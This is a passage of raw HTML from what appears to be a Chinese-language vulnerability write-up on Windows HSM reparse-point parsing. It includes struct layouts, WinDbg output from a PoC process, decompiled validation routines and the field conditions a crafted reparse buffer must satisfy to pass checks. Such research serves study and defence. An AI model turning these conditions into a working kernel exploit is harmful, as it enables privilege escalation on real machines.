&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} REPARSE_DATA_BUFFER, &lt;span style="color:#f92672">*&lt;/span>PREPARSE_DATA_BUFFER;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在
&lt;a href="https://github.com/ladislav-zezula/FileTest" target="_blank">这个Github仓库&lt;/a>中实现了对Reparse point的解析，其中定义了&lt;code>HSM_REPARSE_DATA&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">typedef&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> _HSM_ELEMENT_INFO
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> USHORT Type; &lt;span style="color:#75715e">// Type of the element (?). One of HSM_ELEMENT_TYPE_XXX
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> USHORT Length; &lt;span style="color:#75715e">// Length of the element data in bytes
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> ULONG Offset; &lt;span style="color:#75715e">// Offset of the element data, relative to begin of HSM_DATA. Aligned to 4 bytes
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>} HSM_ELEMENT_INFO, &lt;span style="color:#f92672">*&lt;/span>PHSM_ELEMENT_INFO;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">typedef&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> _HSM_DATA
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ULONG Magic; &lt;span style="color:#75715e">// 0x70527442 (&amp;#39;pRtB&amp;#39;) for bitmap data, 0x70526546 (&amp;#39;FeRp&amp;#39;) for file data
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> ULONG Crc32; &lt;span style="color:#75715e">// CRC32 of the following data (calculated by RtlComputeCrc32)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> ULONG Length; &lt;span style="color:#75715e">// Length of the entire HSM_DATA in bytes
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> USHORT Flags; &lt;span style="color:#75715e">// HSM_DATA_XXXX
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> USHORT NumberOfElements; &lt;span style="color:#75715e">// Number of elements
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> HSM_ELEMENT_INFO ElementInfos[&lt;span style="color:#ae81ff">1&lt;/span>]; &lt;span style="color:#75715e">// Array of element infos. There is fixed maximal items for bitmap and reparse data
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>} HSM_DATA, &lt;span style="color:#f92672">*&lt;/span>PHSM_DATA;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">typedef&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> _HSM_REPARSE_DATA
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> USHORT Flags; &lt;span style="color:#75715e">// Lower 8 bits is revision (must be 1 as of Windows 10 16299)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// Flags: 0x8000 = Data needs to be decompressed by RtlCompressBuffer
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> USHORT Length; &lt;span style="color:#75715e">// Length of the HSM_REPARSE_DATA structure (including &amp;#34;Flags&amp;#34; and &amp;#34;Length&amp;#34;)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HSM_DATA FileData; &lt;span style="color:#75715e">// HSM data
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>} HSM_REPARSE_DATA, &lt;span style="color:#f92672">*&lt;/span>PHSM_REPARSE_DATA;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>对应在 &lt;code>REPARSE_DATA_BUFFER&lt;/code>的偏移如下&lt;/p>
&lt;pre tabindex="0">&lt;code>0:000&amp;gt; dt pa
Local var @ 0xa8444fec08 Type _REPARSE_DATA_BUFFER*
0x000001e0`ef867690
+0x000 ReparseTag : 0x9000301a
+0x004 ReparseDataLength : 0x4008
+0x006 Reserved : 0
+0x008 SymbolicLinkReparseBuffer : _REPARSE_DATA_BUFFER::&amp;lt;unnamed-tag&amp;gt;::&amp;lt;unnamed-type-SymbolicLinkReparseBuffer&amp;gt;
+0x008 MountPointReparseBuffer : _REPARSE_DATA_BUFFER::&amp;lt;unnamed-tag&amp;gt;::&amp;lt;unnamed-type-MountPointReparseBuffer&amp;gt;
+0x008 WimImageReparseBuffer : _REPARSE_DATA_BUFFER::&amp;lt;unnamed-tag&amp;gt;::&amp;lt;unnamed-type-WimImageReparseBuffer&amp;gt;
+0x008 WofReparseBuffer : _REPARSE_DATA_BUFFER::&amp;lt;unnamed-tag&amp;gt;::&amp;lt;unnamed-type-WofReparseBuffer&amp;gt;
+0x008 AppExecLinkReparseBuffer : _REPARSE_DATA_BUFFER::&amp;lt;unnamed-tag&amp;gt;::&amp;lt;unnamed-type-AppExecLinkReparseBuffer&amp;gt;
+0x008 WcifsReparseBuffer : _REPARSE_DATA_BUFFER::&amp;lt;unnamed-tag&amp;gt;::&amp;lt;unnamed-type-WcifsReparseBuffer&amp;gt;
+0x008 hsm_reparse_data : _HSM_REPARSE_DATA
+0x008 GenericReparseBuffer : _REPARSE_DATA_BUFFER::&amp;lt;unnamed-tag&amp;gt;::&amp;lt;unnamed-type-GenericReparseBuffer&amp;gt;
0:000&amp;gt; dx -r1 (*((poc3!_HSM_REPARSE_DATA *)0x1e0ef867698))
(*((poc3!_HSM_REPARSE_DATA *)0x1e0ef867698)) [Type: _HSM_REPARSE_DATA]
[+0x000] Flags : 0x8001 [Type: unsigned short] // 8
[+0x002] Length : 0x4008 [Type: unsigned short] // 10
[+0x004] FileData [Type: _HSM_DATA] // 12
0:000&amp;gt; dx -r1 (*((poc3!_HSM_DATA *)0x1e0ef86769c))
(*((poc3!_HSM_DATA *)0x1e0ef86769c)) [Type: _HSM_DATA]
[+0x000] Magic : 0x70526546 [Type: unsigned long] // 12
[+0x004] Crc32 : 0x31e13b17 [Type: unsigned long] // 16
[+0x008] Length : 0x4004 [Type: unsigned long] // 20
[+0x00c] Flags : 0x2 [Type: unsigned short] // 24
[+0x00e] NumberOfElements : 0xb [Type: unsigned short] // 26
[+0x010] ElementInfos [Type: _HSM_ELEMENT_INFO [10) // 28
&lt;/code>&lt;/pre>&lt;p>&lt;strong>PoC构造&lt;/strong>&lt;/p>
&lt;p>将结构体导入到ida中，在&lt;code>HsmpRpCommitNoLock&lt;/code>中首先对ReparseTag进行验证，而后将hsm_reparse_data和对应的长度导入到 &lt;code>HsmpRpValidateBuffer&lt;/code>函数中验证。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (reparse_data_buffer&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ReparseTag &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xFFFF0FFF&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> dword_1C00235D0 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">LODWORD&lt;/span>(v9) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1073688821&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">HsmDbgBreakOnStatus&lt;/span>(&lt;span style="color:#ae81ff">3221278475&lt;/span>i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( WPP_GLOBAL_Control &lt;span style="color:#f92672">!=&lt;/span> (PDEVICE_OBJECT)&lt;span style="color:#f92672">&amp;amp;&lt;/span>WPP_GLOBAL_Control
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> (&lt;span style="color:#a6e22e">HIDWORD&lt;/span>(WPP_GLOBAL_Control&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Timer) &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">BYTE1&lt;/span>(WPP_GLOBAL_Control&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Timer) &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">2u&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">WPP_SF_qiqDDd&lt;/span>(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> WPP_GLOBAL_Control&lt;span style="color:#f92672">-&amp;gt;&lt;/span>AttachedDevice,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">2&lt;/span>i64,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v30,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> a2,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v5 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v29,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> dword_1C00235D0,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> reparse_data_buffer&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ReparseTag);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_8;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ReparseDataLength &lt;span style="color:#f92672">=&lt;/span> reparse_data_buffer&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ReparseDataLength;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v9 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)&lt;span style="color:#a6e22e">HsmpRpValidateBuffer&lt;/span>(&lt;span style="color:#f92672">&amp;amp;&lt;/span>reparse_data_buffer&lt;span style="color:#f92672">-&amp;gt;&lt;/span>DUMMYUNIONNAME.hsm_reparse_data, ReparseDataLength);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在 &lt;code>HsmpRpValidateBuffer&lt;/code>函数中对HSM_DATA结构体的一些字段做了如下校验。&lt;/p>
&lt;ul>
&lt;li>reparse_data_buffer-&amp;gt;ReparseDataLength &amp;gt; 4&lt;/li>
&lt;li>reparse_data_buffer-&amp;gt;hsm_reparse_data.Flags=1&lt;/li>
&lt;li>reparse_data_buffer-&amp;gt;hsm_reparse_data.FileData.Magic = &amp;lsquo;pReF&amp;rsquo;&lt;/li>
&lt;li>reparse_data_buffer-&amp;gt;hsm_reparse_data.FileData.Flags = 2, 并且reparse_data_buffer-&amp;gt;hsm_reparse_data.FileData.Crc32 == RtlComputeCrc32(0, (PUCHAR)&amp;amp;a1-&amp;gt;FileData.Length, v2 - 8&lt;/li>
&lt;li>NumberOfElements 不为0，且最大为10，最后一个以NONE结尾&lt;/li>
&lt;/ul>
&lt;p>特别的，从如下代码中可以看到对&lt;code>ElementInfos[0]&lt;/code>和&lt;code>ElementInfos[1]&lt;/code>进行了校验，容易得出如下条件：&lt;/p>
&lt;ul>
&lt;li>&lt;code>NumberOfElements &amp;gt; 1&lt;/code>&lt;/li>
&lt;li>&lt;code>FileData.Length &amp;gt;= 0x20&lt;/code>&lt;/li>
&lt;li>`FileData.ElementInfos[1].Type == 0xA&lt;/li>
&lt;li>&lt;code>FileData.ElementInfos[1].Offset &amp;gt;= 8 * NumberOfElements + 16 &amp;amp;&amp;amp; FileData.ElementInfos[1].Offset &amp;lt; FileData.Length&lt;/code>&lt;/li>
&lt;li>&lt;code>FileData.ElementInfos[1].Length == 4&lt;/code>&lt;/li>
&lt;li>&lt;code>FileData.ElementInfos[1].Length + FileData.ElementInfos[1].Offset &amp;lt; 65535&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int16&lt;/span>)NumberOfElements &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1u&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)Length &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> (v22 &lt;span style="color:#f92672">=&lt;/span> a1&lt;span style="color:#f92672">-&amp;gt;&lt;/span>FileData.ElementInfos[&lt;span style="color:#ae81ff">1&lt;/span>].Type, v22 &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x12u&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> ((v23 &lt;span style="color:#f92672">=&lt;/span> a1&lt;span style="color:#f92672">-&amp;gt;&lt;/span>FileData.ElementInfos[&lt;span style="color:#ae81ff">1&lt;/span>].Offset, &lt;span style="color:#f92672">!&lt;/span>(_DWORD)v23) &lt;span style="color:#f92672">||&lt;/span> v23 &lt;span style="color:#f92672">&amp;gt;=&lt;/span> hsm_data_length)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)v23 &lt;span style="color:#f92672">&amp;lt;=&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)Length
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> (v24 &lt;span style="color:#f92672">=&lt;/span> a1&lt;span style="color:#f92672">-&amp;gt;&lt;/span>FileData.ElementInfos[&lt;span style="color:#ae81ff">1&lt;/span>].Length, v24 &lt;span style="color:#f92672">&amp;lt;=&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)Length)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> v24 &lt;span style="color:#f92672">+&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)v23 &lt;span style="color:#f92672">&amp;gt;=&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)v23
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> v24 &lt;span style="color:#f92672">+&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)v23 &lt;span style="color:#f92672">&amp;lt;=&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)Length
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> v22 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> v24 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v5 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(ULONG &lt;span style="color:#f92672">*&lt;/span>)((&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>p_FileData&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Magic &lt;span style="color:#f92672">+&lt;/span> v23);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> IsReparseBufferSupported &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> IsReparseBufferSupported &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xC0000225&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如下代码对&lt;code>ElementInfos[2]&lt;/code>进行了校验，有如下：&lt;/p>
&lt;ul>
&lt;li>&lt;code>FileData.ElementInfos[2].Offset &amp;lt; FileData.Length&lt;/code>&lt;/li>
&lt;li>&lt;code>FileData.ElementInfos[2].Length &amp;lt; FileData.Length&lt;/code>&lt;/li>
&lt;li>&lt;code>FileData.ElementInfos[2].Type == 6&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (element_1_Data &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0x10&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> IsReparseBufferSupported;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v27 &lt;span style="color:#f92672">=&lt;/span> a1&lt;span style="color:#f92672">-&amp;gt;&lt;/span>FileData.Length;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v27 &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x18&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">||&lt;/span> (v28 &lt;span style="color:#f92672">=&lt;/span> a1&lt;span style="color:#f92672">-&amp;gt;&lt;/span>FileData.NumberOfElements, (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int16&lt;/span>)v28 &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">2u&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">||&lt;/span> v27 &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x28&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">||&lt;/span> (v29 &lt;span style="color:#f92672">=&lt;/span> a1&lt;span style="color:#f92672">-&amp;gt;&lt;/span>FileData.ElementInfos[&lt;span style="color:#ae81ff">2&lt;/span>].Type, v29 &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">0x12u&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">||&lt;/span> (v30 &lt;span style="color:#f92672">=&lt;/span> a1&lt;span style="color:#f92672">-&amp;gt;&lt;/span>FileData.ElementInfos[&lt;span style="color:#ae81ff">2&lt;/span>].Offset, (_DWORD)v30) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> v30 &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span> &lt;span style="color:#f92672">*&lt;/span> v28 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">||&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)v30 &lt;span style="color:#f92672">&amp;gt;&lt;/span> v27
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">||&lt;/span> (v31 &lt;span style="color:#f92672">=&lt;/span> a1&lt;span style="color:#f92672">-&amp;gt;&lt;/span>FileData.ElementInfos[&lt;span style="color:#ae81ff">2&lt;/span>].Length, v31 &lt;span style="color:#f92672">&amp;gt;&lt;/span> v27)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">||&lt;/span> v31 &lt;span style="color:#f92672">+&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)v30 &lt;span style="color:#f92672">&amp;lt;&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)v30
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">||&lt;/span> v31 &lt;span style="color:#f92672">+&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)v30 &lt;span style="color:#f92672">&amp;gt;&lt;/span> v27
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">||&lt;/span> v29 &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">||&lt;/span> (IsReparseBufferSupported &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>, v31 &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> IsReparseBufferSupported &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xC0000225&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>后面还有一堆校验逻辑就不贴了。&lt;/p>
&lt;p>在 &lt;code>HsmpRpCommitNoLock&lt;/code>中对 &lt;code>HsmpRpValidateBuffer&lt;/code>返回值做了校验，如果&lt;code>IsReparseBufferSupported&lt;/code>不为0则会进入报错逻辑，而在 &lt;code>HsmpRpValidateBuffer&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span> IsReparseBufferSupported &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)&lt;span style="color:#a6e22e">HsmpRpValidateBuffer&lt;/span>(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>reparse_data_buffer&lt;span style="color:#f92672">-&amp;gt;&lt;/span>DUMMYUNIONNAME.hsm_reparse_data,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ReparseDataLength);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">HsmDbgBreakOnStatus&lt;/span>(IsReparseBufferSupported);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v32 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (IsReparseBufferSupported &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0x80000000&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">HsmDbgBreakOnCorruption&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( a4 &lt;span style="color:#f92672">==&lt;/span> (_BYTE)v32 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( WPP_GLOBAL_Control &lt;span style="color:#f92672">!=&lt;/span> (PDEVICE_OBJECT)&lt;span style="color:#f92672">&amp;amp;&lt;/span>WPP_GLOBAL_Control
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> (&lt;span style="color:#a6e22e">HIDWORD&lt;/span>(WPP_GLOBAL_Control&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Timer) &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在&lt;code>HsmpRpValidateBuffer&lt;/code>中可以看到当通过第一次校验后，如果&lt;code>ElementInfos[1]&lt;/code>的Data &amp;amp; 0x10 则会直接返回，此时&lt;code>IsReparseBufferSupported=0&lt;/code>能通过校验。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int16&lt;/span>)NumberOfElements &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1u&lt;/span>
